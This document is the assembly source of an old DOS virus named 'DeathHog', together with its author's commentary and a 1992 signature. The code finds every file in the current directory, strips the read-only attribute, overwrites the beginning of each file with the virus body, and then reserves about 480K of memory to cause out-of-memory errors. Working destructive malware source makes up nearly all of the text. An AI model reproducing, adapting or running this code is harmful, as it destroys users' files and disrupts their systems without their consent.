; DeathHog, (will defeat read-only files and appends itself to all
; files)
; Originally based upon DeathCow (C) 1991 by Nowhere Man and [NuKE] WaErZ 
; r/w access, nuisance routines supplied by KOUCH
;
; Appended by Kouch, derived from DeathCow/Define (author unknown)


virus_length    equ     finish - start

    code    segment 'CODE'
        assume cs:code,ds:code,es:code,ss:code

        org     0100h

start           label   near

main            proc    near
        mov     ah,04Eh                 ; DOS find first file function
        mov     dx,offset file_spec      ; DX points to "*.*" - any file
        int     021h

infect_file :   mov     ah,43H                 ;the beginning of this
        mov     al,0                   ;routine gets the file's
        mov     dx,09Eh                ;attribute and changes it
        int     21H                    ;to r/w access so that when
                           ;it comes time to open the
        mov     ah,43H                 ;file, the virus can easily
        mov     al,1                   ;defeat files with a 'read only'
        mov     dx,09Eh                ;attribute. It leaves the file r/w,
        mov     cl,0                   ;because who checks that, anyway?
        int     21H
        
        mov     ax,03D01h              ; DOS open file function, write-only
        mov     dx,09Eh                ; DX points to the found file
        int     021h

        xchg    bx,ax                  ; BX holds file handle

        mov     ah,040h                ; DOS write to file function
        mov     cl,virus_length        ; CL holds # of bytes to write
        mov     dx,offset main         ; DX points to start of code
        int     021h

        mov     ah,03Eh                ; DOS close file function
        int     021h

        mov     ah,04Fh                 ; DOS find next file function
        int     021h
        jnc     infect_file             ; Infect next file, if found

        mov     ah,31h                  ;insert 480K memory balloon
        mov     dx,7530h                ;for nuisance value
        int     21H                     ;it's big enough so 'out of
                        ;memory' messages will start cropping up quickly
                           ; RETurn to DOS

file_spec       db      "*.*",0               ; Files to infect:  apped to all files
main            endp

finish          label   near

    code    ends
        end     main

Based upon the 42-byte Define virus as modified by Nowhere Man,
DeathHog adds about 20 bytes so that it can now defeat
'read-only' files. DeathHog will overwrite every file
in the current directory upon execution. In the past,
the Define viruses were only .COM infectors, but since
the virus just performs a basic overwrite, obliterating
the front end of the infected program, there seemed no compelling
reason not to allow it to append itself to every
file in the current directory.

For value added, DeathHog will insert a 480K memory balloon
into RAM after infection. This will doubtless draw attention
to it rather quickly, but the basic Define virus is kind
of a fine kamikaze creation anyway.

The .asm source code is included.

URNST KOUCH/Crypt/July 1992
